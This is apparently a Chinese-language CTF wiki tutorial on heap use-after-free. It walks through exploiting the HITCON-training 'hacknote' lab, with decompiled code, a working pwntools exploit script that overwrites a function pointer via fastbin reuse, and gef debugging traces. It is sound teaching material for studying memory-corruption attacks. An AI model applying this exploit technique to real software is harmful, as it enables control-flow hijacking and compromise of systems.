# Use After Free

## 原理

簡單的說，Use After Free 就是其字面所表達的意思，當一個內存塊被釋放之後再次被使用。但是其實這裏有以下幾種情況

- 內存塊被釋放後，其對應的指針被設置爲 NULL ， 然後再次使用，自然程序會崩潰。
- 內存塊被釋放後，其對應的指針沒有被設置爲 NULL ，然後在它下一次被使用之前，沒有代碼對這塊內存塊進行修改，那麼**程序很有可能可以正常運轉**。
- 內存塊被釋放後，其對應的指針沒有被設置爲NULL，但是在它下一次使用之前，有代碼對這塊內存進行了修改，那麼當程序再次使用這塊內存時，**就很有可能會出現奇怪的問題**。


而我們一般所指的 **Use After Free** 漏洞主要是後兩種。此外，**我們一般稱被釋放後沒有被設置爲NULL的內存指針爲dangling pointer。**

這裏給出一個簡單的例子

```c++
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}
```

運行結果如下

```shell
➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    38738 segmentation fault (core dumped)  ./use_after_free
```

## 例子

這裏我們以 HITCON-training 中的 [lab 10 hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/use_after_free/hitcon-training-hacknote) 爲例。

### 功能分析

我們可以簡單分析下程序，可以看出在程序的開頭有個menu函數，其中有

```c
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
```

故而程序應該主要有3個功能。之後程序會根據用戶的輸入執行相應的功能。

#### add_note

根據程序，我們可以看出程序最多可以添加5個note。每個note有兩個字段: `void (*printnote)();` 與`char *content;`，其中`printnote`會被設置爲一個函數，其函數功能爲輸出 `content` 具體的內容。

note的結構體定義如下:
```c
struct note {
  void (*printnote)();
  char *content;
};
```
add_note 函數代碼如下:
```c++
unsigned int add_note()
{
  note *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        notelist[i]->put = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0->content = malloc(size);
        if ( !notelist[i]->content )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, notelist[i]->content, size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

#### print_note

print_note就是簡單的根據給定的note的索引來輸出對應索引的note的內容。

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    notelist[v1]->put(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

#### delete_note

delete_note 會根據給定的索引來釋放對應的note。但是值得注意的是，在 刪除的時候，只是單純進行了free，而沒有設置爲NULL，那麼顯然，這裏是存在Use After Free的情況的。

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(notelist[v1]->content);
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### 利用分析

我們可以看到 Use After Free 的情況確實可能會發生，那麼怎麼可以讓它發生並且進行利用呢？需要同時注意的是，這個程序中還有一個magic函數，我們有沒有可能來通過use after free 來使得這個程序執行magic函數呢？**一個很直接的想法是修改note的`printnote`字段爲magic函數的地址，從而實現在執行`printnote` 的時候執行magic函數。** 那麼該怎麼執行呢？                                                                         

我們可以簡單來看一下每一個note生成的具體流程

1. 程序申請8字節內存用來存放note中的printnote以及content指針。
2. 程序根據輸入的size來申請指定大小的內存，然後用來存儲content。

           +-----------------+                       
           |   printnote     |                       
           +-----------------+                       
           |   content       |       size              
           +-----------------+------------------->+----------------+
                                                  |     real       |
                                                  |    content     |
                                                  |                |
                                                  +----------------+

那麼，根據我們之前在堆的實現中所學到的，顯然note是一個fastbin chunk（大小爲16字節）。我們的目的是希望一個note的put字段爲magic的函數地址，那麼我們必須想辦法讓某個note的printnote指針被覆蓋爲magic地址。由於程序中只有唯一的地方對printnote進行賦值。所以我們必須利用寫real content的時候來進行覆蓋。具體採用的思路如下

- 申請note0，real content size爲16（大小與note大小所在的bin不一樣即可）
- 申請note1，real content size爲16（大小與note大小所在的bin不一樣即可）
- 釋放note0
- 釋放note1
- 此時，大小爲16的fast bin chunk中鏈表爲note1->note0
- 申請note2，並且設置real content的大小爲8，那麼根據堆的分配規則
  - note2其實會分配note1對應的內存塊。
  - real content 對應的chunk其實是note0。
- 如果我們這時候向note2 real content的chunk部分寫入magic的地址，那麼由於我們沒有note0爲NULL。當我們再次嘗試輸出note0的時候，程序就會調用magic函數。

### 利用腳本

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./hacknote')


def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


#gdb.attach(r)
magic = 0x08048986

addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1

delnote(0) # delete note 0
delnote(1) # delete note 1

addnote(8, p32(magic)) # add note 2

printnote(0) # print note 0

r.interactive()
```

我們可以具體看一下執行的流程，首先先下斷點

**兩處malloc下斷點**

```shell
gef➤  b *0x0804875C
Breakpoint 1 at 0x804875c
gef➤  b *0x080486CA
Breakpoint 2 at 0x80486ca
```

**兩處free下斷點**

```shell
gef➤  b *0x08048893
Breakpoint 3 at 0x8048893
gef➤  b *0x080488A9
Breakpoint 4 at 0x80488a9
```

然後繼續執行程序，可以看出申請note0時，所申請到的內存塊地址爲0x0804b008。（eax存儲函數返回值）

```asm
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10
    0x80486d2 <add_note+92>    mov    edx, eax
    0x80486d4 <add_note+94>    mov    eax, DWORD PTR [ebp-0x1c]
    0x80486d7 <add_note+97>    mov    DWORD PTR [eax*4+0x804a070], edx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000008	 ← $esp
0xffffcf14│+0x04: 0x00000000
0xffffcf18│+0x08: 0xf7e29ef5  →  <strtol+5> add eax, 0x18210b
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x80486cf → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b008
UsedChunk(addr=0x804b008, size=0x10)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

**申請note 0的content的地址爲0x0804b018**

```asm
$eax   : 0x0804b018  →  0x00000000
$ebx   : 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b018  →  0x00000000
$esp   : 0xffffcf10  →  0x00000020
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
    0x8048764 <add_note+238>   mov    DWORD PTR [ebx+0x4], eax
    0x8048767 <add_note+241>   mov    eax, DWORD PTR [ebp-0x1c]
    0x804876a <add_note+244>   mov    eax, DWORD PTR [eax*4+0x804a070]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000020	 ← $esp
0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233
0xffffcf18│+0x08: 0x00000008
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x8048761 → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b018
UsedChunk(addr=0x804b018, size=0x28)
Chunk size: 40 (0x28)
Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

類似的，我們可以得到note1的地址以及其content的地址分別爲0x0804b040 和0x0804b050。

同時，我們還可以看到note0與note1對應的content確實是相應的內存塊。

```asm
gef➤  grep aaaa
[+] Searching 'aaaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b018 - 0x804b01c  →   "aaaa" 
gef➤  grep ddaa
[+] Searching 'ddaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b050 - 0x804b054  →   "ddaa" 
```

下面就是free的過程了。我們可以依次發現首先，note0的content被free

```asm
 →  0x8048893 <del_note+143>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b018  →  "aaaa"	 ← $esp

```

然後是note0本身

```asm
 →  0x80488a9 <del_note+165>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp	 ← $esp
```

當delete結束後，我們觀看一下bins，可以發現，確實其被存放在對應的fast bin中，

```c++
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

當我們將note1也全部刪除完畢後，再次觀看bins。可以看出，後刪除的chunk塊確實處於表頭。

```asm
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00

```

那麼，此時即將要申請note2，我們可以看下note2都申請到了什麼內存塊，如下

**申請note2對應的內存塊爲0x804b040，其實就是note1對應的內存地址。**

```asm
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
0x080486cf in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b040  →  0x0804b000  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10

```

**申請note2的content的內存地址爲0x804b008，就是note0對應的地址，即此時我們向note2的content寫內容，就會將note0的put字段覆蓋。**

```asm
gef➤  n 1
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
0x08048761 in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x0804b040  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
```

我們來具體檢驗一下，看一下覆蓋前的情況，可以看到該內存塊的`printnote`指針已經被置爲NULL了，這是由fastbin的free機制決定的。

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x00000000	0x0804b018
```

覆蓋後，具體的值如下

```asm
gef➤  x/2xw 0x804b008
0x804b008:	0x08048986	0x0804b00a
gef➤  x/i 0x08048986
   0x8048986 <magic>:	push   ebp
```

可以看出，確實已經被覆蓋爲我們所想要的magic函數了。

最後執行的效果如下

```shell
[+] Starting local process './hacknote': pid 35030
[*] Switching to interactive mode
flag{use_after_free}----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
```

同時，我們還可以藉助gef的heap-analysis-helper 來看一下整體的堆的申請與釋放的情況，如下

```asm
gef➤  heap-analysis-helper 
[*] This feature is under development, expect bugs and unstability...
[+] Tracking malloc()
[+] Tracking free()
[+] Tracking realloc()
[+] Disabling hardware watchpoints (this may increase the latency)
[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.
[*] Note: The heap analysis slows down noticeably the execution. 
gef➤  c
Continuing.
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(32)=0x804b018
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(32)=0x804b050
[+] Heap-Analysis - free(0x804b018)
[+] Heap-Analysis - watching 0x804b018
[+] Heap-Analysis - free(0x804b008)
[+] Heap-Analysis - watching 0x804b008
[+] Heap-Analysis - free(0x804b050)
[+] Heap-Analysis - watching 0x804b050
[+] Heap-Analysis - free(0x804b040)
[+] Heap-Analysis - watching 0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - Cleaning up
[+] Heap-Analysis - Re-enabling hardware watchpoints
[New process 36248]
process 36248 is executing new program: /bin/dash
[New process 36249]
process 36249 is executing new program: /bin/cat
[Inferior 3 (process 36249) exited normally]
```

這裏第一個輸出了兩次，應該是gef工具的問題。

## 題目

- 2016 HCTF fheap

